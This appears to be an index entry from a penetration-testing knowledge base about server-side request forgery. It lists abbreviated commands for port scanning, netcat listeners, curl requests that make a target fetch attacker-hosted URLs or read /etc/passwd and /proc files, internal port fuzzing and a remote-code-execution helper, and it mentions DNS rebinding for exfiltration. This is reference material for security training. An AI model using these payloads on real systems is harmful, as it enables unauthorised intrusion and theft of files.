...
severity_hint: "high"
tags: ["SSRF", "Open Redirect", "DNS", "Account Takeover", "HTTP"]
source: "_raw/Web attacks/Web Attacks/SSRF.md"
source_sha256: "10b2fcb3d77ec2eb29844d2cccda2c25ebcefbd172c290d6f9f0918f623152eb"
curator_version: 2
...
> Family: **ssrf-xxe-file** · Severity hint: **high** · Tags: SSRF, Open Redirect, DNS, Account Takeover, HTTP
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: curl, ffuf, nmap, openssl, python3.

## Quick index — payloads & commands in this note
- `bash: $ nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>`
- `bash: $ curl -i -s http://<TARGET IP>`
- `bash: $ curl -i -s -L http://<TARGET IP>`
- `bash: $ nc -nvlp 8080`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"`
- `bash: Connection received on <TARGET IP> 49852`
- `html: <html>`
- `bash: $ python3 -m http.server 9090`
- `bash: $ sudo pip3 install twisted`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd"`
- `bash: $ for port in {1..65535};do echo $port >> ports.txt;done`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"`
- `bash: $ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0`
- `bash: $ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/s`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/in`
- `bash: ]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.`
- `bash: $ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0`
- `bash: $ echo "encode me" | jq -sRr @uri`
- `bash: ]$ function rce() {`
- `bash: $ rce`
- `html: <!DOCTYPE html>`
- `bash: $ sudo nc -nlvp 9090`
- … +23 more (see body)
...
If you are having **problems** to **exfiltrate content from a local IP** because of **CORS/SOP**, **DNS Rebidding** can be used to bypass that limitation: CORS 
...
## Source
Original note: `_raw/Web attacks/Web Attacks/SSRF.md`
